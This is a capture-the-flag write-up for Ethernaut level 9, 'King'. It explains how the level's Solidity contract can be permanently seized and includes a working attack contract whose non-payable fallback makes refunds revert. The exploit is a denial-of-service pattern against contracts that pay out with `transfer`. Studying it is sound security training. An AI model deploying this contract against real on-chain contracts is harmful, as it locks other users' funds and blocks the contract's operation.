## Ethernaut Level 09 - King - Write-Up
<!--Authors: OofedUp-->

Difficulty: 6/10

Objective: When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

![image](https://i.imgur.com/SwYCdF9.png)

## Source
```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

We have to first become king by triggering the fallback function with a value higher than `prize` (which at first is 1 ETH).

After we become king, we must somehow make the fallback function fail when the level gets submitted. We can cause a fail here:

```javascript
king.transfer(msg.value);
```

By becoming king from a contract which has a non payable fallback function (or doesn't have fallback function at all), `king.transfer(msg.value)` will fail, because `address.transfer` will throw an error on failure, unlike `address.send`.

Here's the contract I used:

```javascript

interface King{

}

contract KingForever{
    King game;
    address target = ADDR_OF_INSTANCE_HERE;
    address public owner;

    function KingForever() payable{
        game = King(target);
        owner = msg.sender;
    }

    function becomeKing(){
        target.call.value(1.00001 ether)( );
    }

    function(){
        //Not payable causes error
    }

    function getBack() public{
        require(msg.sender == owner);
        owner.send(this.balance);
    }
}
```

Keep in mind we need to transfer the contract `1.00001` on creation, so it can pay the King contract. After we call the `becomeKing()` function we can submit the instance since it will fail:

![image](https://i.imgur.com/n4ES9Q8.png)
